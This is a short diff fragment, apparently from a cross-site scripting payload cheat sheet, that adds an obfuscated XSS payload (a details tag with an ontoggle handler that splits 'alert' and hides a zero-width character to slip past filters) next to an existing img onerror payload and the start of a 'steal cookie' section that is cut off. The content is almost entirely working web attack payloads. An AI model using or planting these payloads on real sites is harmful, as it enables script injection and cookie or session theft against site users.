@@ -2,6 +2,10 @@
 
     <img src=x onerror=alert(PAYLOAD)>
 
+Otro
+
+    <details open ontoggle​=content['al'%2B'ert'](1) >
+
 #### steal cookie:
 
 A
